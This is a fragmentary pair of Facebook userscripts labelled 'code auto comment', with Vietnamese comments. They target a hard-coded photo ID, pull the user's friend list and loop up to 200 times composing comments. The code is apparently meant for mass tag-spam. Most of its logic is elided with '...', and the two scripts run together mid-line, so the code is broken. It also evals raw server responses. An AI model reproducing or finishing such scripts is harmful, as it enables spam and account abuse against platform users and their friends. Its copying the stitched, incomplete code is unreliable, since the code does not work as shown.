// ==UserScript==
// @name           bắt buộc phải có 11
// @description     code auto comment
...
var id = "618153478255919"; //id ảnh  cần comment
var arkadaslar = [];
var svn_rev;
...
{            
	...
	xmlhttp.onreadystatechange = function ()
	{
		if(xmlhttp.readyState == 4)
		{
			...
			var thanhdat2599=1649; //số bắt đầu
			var i;
			 for(f=1;f<200;f++)
			{
				mesaj = "";mesaj_text = "";
...
arkadaslari_al(id);// ==UserScript==
// @name           bắt buộc phải có 10
// @description     code auto comment
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
...
{            
	...
	xmlhttp.onreadystatechange = function ()
	{
		...
		{
			eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			var thanhdat2599=1597; //số bắt đầu
			var i;
			 for(f=1;f<200;f++)
			{
				mesaj = "";mesaj_text = "";
